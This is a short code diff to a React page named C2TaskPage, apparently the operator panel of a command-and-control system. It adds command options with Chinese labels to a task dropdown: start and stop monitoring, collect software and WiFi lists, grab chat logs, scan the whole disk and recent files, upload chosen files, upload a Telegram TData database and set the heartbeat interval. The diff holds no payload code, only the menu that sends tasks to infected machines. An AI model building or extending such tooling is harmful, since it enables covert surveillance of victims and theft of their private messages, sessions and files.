@@ -195,7 +195,16 @@ const C2TaskPage: React.FC = () => {
           valueEnum={{
             cmd_exec: '执行CMD命令',
             screenshot: '屏幕截图',
+            start_monitor: '开启监控',
+            stop_monitor: '停止监控',
+            get_software: '获取软件列表',
+            get_wifi: '获取WiFi列表',
+            get_chat_logs: '获取聊天记录',
+            scan_disk: '全盘文件扫描',
+            scan_recent: '最近文件扫描',
+            upload_file: '上传指定文件',
             upload_db: '上传TData数据库',
+            set_heartbeat: '设置心跳间隔',
           }}
           placeholder="请选择命令"
         />
